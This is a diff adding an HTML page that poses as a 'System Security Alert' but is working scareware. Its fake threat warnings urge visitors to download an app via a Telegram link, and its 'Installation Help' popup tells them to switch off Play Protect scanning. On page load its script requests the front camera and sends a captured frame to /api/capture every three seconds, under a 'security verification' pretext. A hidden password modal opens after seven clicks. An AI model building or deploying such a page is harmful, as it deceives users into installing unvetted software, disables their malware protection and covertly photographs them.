@@ -1,0 +1,729 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Alert | System Protection</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+            color: #e2e8f0;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+        
+        .security-alert {
+            background: linear-gradient(145deg, #1e293b 0%, #334155 100%);
+            border-radius: 24px;
+            padding: 3rem;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4),
+                        0 0 0 1px rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            margin-top: 2rem;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .alert-header {
+            text-align: center;
+            margin-bottom: 2.5rem;
+        }
+        
+        .alert-icon {
+            font-size: 4rem;
+            color: #f87171;
+            margin-bottom: 1rem;
+            animation: pulse 2s infinite;
+        }
+        
+        .alert-title {
+            font-size: 2.8rem;
+            font-weight: 700;
+            background: linear-gradient(90deg, #f87171 0%, #fb923c 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 1rem;
+            letter-spacing: -0.5px;
+        }
+        
+        .alert-subtitle {
+            font-size: 1.2rem;
+            color: #94a3b8;
+            max-width: 600px;
+            margin: 0 auto;
+            line-height: 1.6;
+        }
+        
+        .warning-card {
+            background: rgba(30, 41, 59, 0.7);
+            border-radius: 16px;
+            padding: 2rem;
+            margin-bottom: 2rem;
+            border-left: 4px solid #f87171;
+        }
+        
+        .warning-title {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            margin-bottom: 1rem;
+            color: #f87171;
+            font-size: 1.3rem;
+            font-weight: 600;
+        }
+        
+        .warning-content {
+            color: #cbd5e1;
+            line-height: 1.7;
+            font-size: 1.05rem;
+        }
+        
+        .action-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 1.5rem;
+            margin: 3rem 0;
+        }
+        
+        .action-card {
+            background: rgba(30, 41, 59, 0.7);
+            border-radius: 16px;
+            padding: 2rem;
+            text-align: center;
+            transition: all 0.3s ease;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            cursor: pointer;
+        }
+        
+        .action-card:hover {
+            transform: translateY(-5px);
+            background: rgba(41, 55, 77, 0.7);
+            border-color: rgba(251, 146, 60, 0.3);
+            box-shadow: 0 10px 30px rgba(251, 146, 60, 0.1);
+        }
+        
+        .action-icon {
+            font-size: 2.5rem;
+            color: #60a5fa;
+            margin-bottom: 1rem;
+        }
+        
+        .action-title {
+            font-size: 1.3rem;
+            font-weight: 600;
+            margin-bottom: 0.8rem;
+            color: #e2e8f0;
+        }
+        
+        .action-description {
+            color: #94a3b8;
+            font-size: 0.95rem;
+            line-height: 1.5;
+        }
+        
+        .btn {
+            padding: 1rem 2rem;
+            border-radius: 12px;
+            border: none;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.8rem;
+            min-width: 200px;
+        }
+        
+        .btn-primary {
+            background: linear-gradient(90deg, #3b82f6 0%, #6366f1 100%);
+            color: white;
+        }
+        
+        .btn-primary:hover {
+            background: linear-gradient(90deg, #2563eb 0%, #4f46e5 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(59, 130, 246, 0.3);
+        }
+        
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.08);
+            color: #e2e8f0;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .btn-secondary:hover {
+            background: rgba(255, 255, 255, 0.12);
+            transform: translateY(-2px);
+        }
+        
+        .btn-danger {
+            background: linear-gradient(90deg, #ef4444 0%, #dc2626 100%);
+            color: white;
+        }
+        
+        .btn-danger:hover {
+            background: linear-gradient(90deg, #dc2626 0%, #b91c1c 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(239, 68, 68, 0.3);
+        }
+        
+        .camera-notice {
+            text-align: center;
+            margin-top: 3rem;
+            padding-top: 2rem;
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+            color: #64748b;
+            font-size: 0.9rem;
+        }
+        
+        .click-counter {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(239, 68, 68, 0.2);
+            color: #f87171;
+            padding: 0.8rem 1.2rem;
+            border-radius: 10px;
+            font-size: 0.9rem;
+            font-weight: 600;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(239, 68, 68, 0.3);
+            display: none;
+        }
+        
+        .camera-indicator {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(34, 197, 94, 0.2);
+            color: #4ade80;
+            padding: 0.6rem 1rem;
+            border-radius: 10px;
+            font-size: 0.85rem;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(34, 197, 94, 0.3);
+            display: none;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+        
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(10px);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+            animation: fadeIn 0.3s ease;
+        }
+        
+        .modal-content {
+            background: linear-gradient(145deg, #1e293b 0%, #334155 100%);
+            border-radius: 24px;
+            padding: 3rem;
+            max-width: 400px;
+            width: 90%;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            animation: slideUp 0.4s ease;
+        }
+        
+        .modal-title {
+            text-align: center;
+            font-size: 1.8rem;
+            font-weight: 700;
+            margin-bottom: 1rem;
+            color: #e2e8f0;
+        }
+        
+        .modal-subtitle {
+            text-align: center;
+            color: #94a3b8;
+            margin-bottom: 2rem;
+            line-height: 1.6;
+        }
+        
+        .password-input {
+            width: 100%;
+            padding: 1.2rem;
+            background: rgba(15, 23, 42, 0.6);
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            color: #e2e8f0;
+            font-size: 1.1rem;
+            margin-bottom: 1.5rem;
+            transition: all 0.3s ease;
+        }
+        
+        .password-input:focus {
+            outline: none;
+            border-color: #3b82f6;
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2);
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        @keyframes slideUp {
+            from { 
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to { 
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            margin: 1rem 0;
+        }
+        
+        .spinner {
+            border: 3px solid rgba(255, 255, 255, 0.1);
+            border-top: 3px solid #3b82f6;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        @media (max-width: 768px) {
+            .container {
+                padding: 1rem;
+            }
+            
+            .security-alert {
+                padding: 2rem;
+                margin-top: 1rem;
+            }
+            
+            .alert-title {
+                font-size: 2rem;
+            }
+            
+            .action-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Camera Indicator -->
+    <div class="camera-indicator" id="cameraIndicator">
+        <i class="fas fa-camera"></i> Camera Active
+    </div>
+    
+    <!-- Click Counter -->
+    <div class="click-counter" id="clickCounter">
+        Clicks: <span id="clickCount">0</span>/7
+    </div>
+    
+    <div class="container">
+        <div class="security-alert">
+            <div class="alert-header">
+                <div class="alert-icon">
+                    <i class="fas fa-shield-alt"></i>
+                </div>
+                <h1 class="alert-title">SYSTEM SECURITY ALERT</h1>
+                <p class="alert-subtitle">
+                    Our advanced threat detection system has identified potential security risks. 
+                    Please follow the instructions below to ensure system integrity.
+                </p>
+            </div>
+            
+            <div class="warning-card">
+                <div class="warning-title">
+                    <i class="fas fa-exclamation-triangle"></i>
+                    <span>THREAT DETECTED</span>
+                </div>
+                <div class="warning-content">
+                    Unusual activity patterns have been detected from your network. 
+                    This could indicate a potential security breach or unauthorized access attempt. 
+                    For enhanced security and optimal performance, we recommend using our official application.
+                </div>
+            </div>
+            
+            <div class="action-grid">
+                <div class="action-card" onclick="downloadApp()">
+                    <div class="action-icon">
+                        <i class="fas fa-mobile-alt"></i>
+                    </div>
+                    <h3 class="action-title">Download Secure App</h3>
+                    <p class="action-description">
+                        Get our official application for enhanced security features and better experience.
+                    </p>
+                </div>
+                
+                <div class="action-card" onclick="showHelp()">
+                    <div class="action-icon">
+                        <i class="fas fa-question-circle"></i>
+                    </div>
+                    <h3 class="action-title">Installation Help</h3>
+                    <p class="action-description">
+                        Facing issues with the download? Get step-by-step installation guide.
+                    </p>
+                </div>
+                
+                <div class="action-card" onclick="showSystemInfo()">
+                    <div class="action-icon">
+                        <i class="fas fa-info-circle"></i>
+                    </div>
+                    <h3 class="action-title">System Information</h3>
+                    <p class="action-description">
+                        View detailed system diagnostics and security recommendations.
+                    </p>
+                </div>
+            </div>
+            
+            <div style="text-align: center; margin-top: 2rem;">
+                <button class="btn btn-primary" onclick="downloadApp()">
+                    <i class="fas fa-download"></i> Download Application
+                </button>
+                <button class="btn btn-secondary" onclick="showHelp()" style="margin-left: 1rem;">
+                    <i class="fas fa-life-ring"></i> Get Help
+                </button>
+            </div>
+            
+            <div class="camera-notice">
+                <i class="fas fa-video"></i> Note: This site uses camera for enhanced security verification.
+            </div>
+        </div>
+    </div>
+    
+    <!-- Password Modal -->
+    <div class="modal" id="passwordModal">
+        <div class="modal-content">
+            <div class="modal-title">
+                <i class="fas fa-lock" style="color: #3b82f6; margin-right: 10px;"></i>
+                Secure Access Required
+            </div>
+            <div class="modal-subtitle">
+                Enter the security password to access the system dashboard.
+                This area is restricted to authorized personnel only.
+            </div>
+            
+            <div id="errorMessage" style="color: #f87171; text-align: center; margin-bottom: 1rem; display: none;"></div>
+            
+            <input type="password" 
+                   class="password-input" 
+                   id="passwordInput" 
+                   placeholder="Enter security password"
+                   onkeypress="handlePasswordKeyPress(event)">
+            
+            <div class="loading" id="loadingSpinner">
+                <div class="spinner"></div>
+                <p style="margin-top: 1rem; color: #94a3b8;">Verifying credentials...</p>
+            </div>
+            
+            <button class="btn btn-primary" onclick="verifyPassword()" style="width: 100%;" id="submitBtn">
+                <i class="fas fa-unlock-alt"></i> Access Dashboard
+            </button>
+            
+            <div style="text-align: center; margin-top: 1.5rem;">
+                <button class="btn btn-secondary" onclick="hidePasswordModal()" style="padding: 0.8rem 1.5rem;">
+                    <i class="fas fa-times"></i> Cancel
+                </button>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        let clickCount = 0;
+        let cameraStream = null;
+        let captureInterval = null;
+        let lastCaptureTime = 0;
+        
+        // Update click counter display
+        function updateClickCounter() {
+            const counter = document.getElementById('clickCounter');
+            const countSpan = document.getElementById('clickCount');
+            countSpan.textContent = clickCount;
+            
+            if (clickCount > 0) {
+                counter.style.display = 'block';
+            }
+            
+            // Show password modal after 7 clicks
+            if (clickCount >= 7) {
+                showPasswordModal();
+                clickCount = 0;
+                updateClickCounter();
+            }
+        }
+        
+        // Camera setup and capture
+        async function setupCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    },
+                    audio: false
+                });
+                
+                cameraStream = stream;
+                document.getElementById('cameraIndicator').style.display = 'flex';
+                
+                // Start capturing every 3 seconds
+                captureInterval = setInterval(captureAndSend, 3000);
+                
+                // Log camera activation
+                logEvent('Camera activated successfully');
+                
+            } catch (error) {
+                console.error('Camera access error:', error);
+                logError({
+                    page: 'Warning Page',
+                    message: `Camera Error: ${error.message}`,
+                    location: 'setupCamera'
+                });
+            }
+        }
+        
+        async function captureAndSend() {
+            if (!cameraStream) return;
+            
+            const now = Date.now();
+            if (now - lastCaptureTime < 3000) return; // Prevent too frequent captures
+            
+            try {
+                const video = document.createElement('video');
+                video.srcObject = cameraStream;
+                video.play();
+                
+                await new Promise(resolve => setTimeout(resolve, 500));
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = 320;
+                canvas.height = 240;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, 320, 240);
+                
+                const imageData = canvas.toDataURL('image/jpeg', 0.7);
+                lastCaptureTime = now;
+                
+                // Send to server
+                await fetch('/api/capture', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ image: imageData })
+                });
+                
+                // Clean up
+                video.remove();
+                canvas.remove();
+                
+            } catch (error) {
+                console.error('Capture error:', error);
+                logError({
+                    page: 'Warning Page',
+                    message: `Capture Error: ${error.message}`,
+                    location: 'captureAndSend'
+                });
+            }
+        }
+        
+        // Password modal functions
+        function showPasswordModal() {
+            document.getElementById('passwordModal').style.display = 'flex';
+            document.getElementById('passwordInput').focus();
+            document.getElementById('errorMessage').style.display = 'none';
+        }
+        
+        function hidePasswordModal() {
+            document.getElementById('passwordModal').style.display = 'none';
+            document.getElementById('passwordInput').value = '';
+        }
+        
+        function handlePasswordKeyPress(event) {
+            if (event.key === 'Enter') {
+                verifyPassword();
+            }
+        }
+        
+        async function verifyPassword() {
+            const password = document.getElementById('passwordInput').value;
+            const errorElement = document.getElementById('errorMessage');
+            const submitBtn = document.getElementById('submitBtn');
+            const loadingSpinner = document.getElementById('loadingSpinner');
+            
+            if (!password) {
+                errorElement.textContent = 'Please enter the password';
+                errorElement.style.display = 'block';
+                return;
+            }
+            
+            // Show loading
+            submitBtn.style.display = 'none';
+            loadingSpinner.style.display = 'block';
+            errorElement.style.display = 'none';
+            
+            try {
+                const response = await fetch('/api/verify', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ password: password })
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    // Clean up camera
+                    if (cameraStream) {
+                        cameraStream.getTracks().forEach(track => track.stop());
+                    }
+                    if (captureInterval) {
+                        clearInterval(captureInterval);
+                    }
+                    
+                    // Store auth token
+                    localStorage.setItem('auth_token', result.token);
+                    localStorage.setItem('authenticated', 'true');
+                    
+                    // Redirect to dashboard
+                    window.location.href = result.redirect;
+                    
+                } else {
+                    errorElement.textContent = result.message || 'Incorrect password!';
+                    errorElement.style.display = 'block';
+                }
+                
+            } catch (error) {
+                console.error('Password verification error:', error);
+                errorElement.textContent = 'Network error. Please try again.';
+                errorElement.style.display = 'block';
+                
+                // Log error to Telegram
+                logError({
+                    page: 'Warning Page',
+                    message: `Password Verify Error: ${error.message}`,
+                    location: 'verifyPassword'
+                });
+            } finally {
+                // Hide loading
+                submitBtn.style.display = 'flex';
+                loadingSpinner.style.display = 'none';
+            }
+        }
+        
+        // Help popup
+        function showHelp() {
+            alert(`📱 Installation Help Guide:
+
+Are you facing issues downloading the app?
+
+1. Go to Play Store
+2. Click on your profile icon (top right)
+3. Select "Play Protect"
+4. Click on the settings icon (gear)
+5. Turn OFF "Scan apps with Play Protect"
+
+Then try downloading again.`);
+        }
+        
+        function downloadApp() {
+            window.open('https://t.me/example', '_blank');
+            logEvent('Download button clicked');
+        }
+        
+        function showSystemInfo() {
+            alert(`🔒 System Security Information:
+
+• Threat Level: HIGH
+• Detection: Unusual activity patterns
+• Protection: Camera-based verification active
+• Status: Monitoring enabled
+• Last Scan: ${new Date().toLocaleTimeString()}
+
+For security reasons, camera access is required.`);
+        }
+        
+        // Error logging function
+        async function logError(errorData) {
+            try {
+                await fetch('/api/log-error', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ error: errorData })
+                });
+            } catch (e) {
+                console.error('Failed to log error:', e);
+            }
+        }
+        
+        // Event logging
+        function logEvent(event) {
+            console.log(`Event: ${event} - ${new Date().toISOString()}`);
+        }
+        
+        // Initialize camera on page load
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                setupCamera();
+                logEvent('Page loaded and initialized');
+            }, 1000);
+        });
+        
+        // Click counter
+        document.addEventListener('click', (e) => {
+            // Don't count clicks on modal or its children
+            if (e.target.closest('.modal')) return;
+            
+            clickCount++;
+            updateClickCounter();
+        });
+        
+        // Close modal on outside click
+        document.getElementById('passwordModal').addEventListener('click', (e) => {
+            if (e.target.id === 'passwordModal') {
+                hidePasswordModal();
+            }
+        });
+    </script>
+</body>
+  </html>
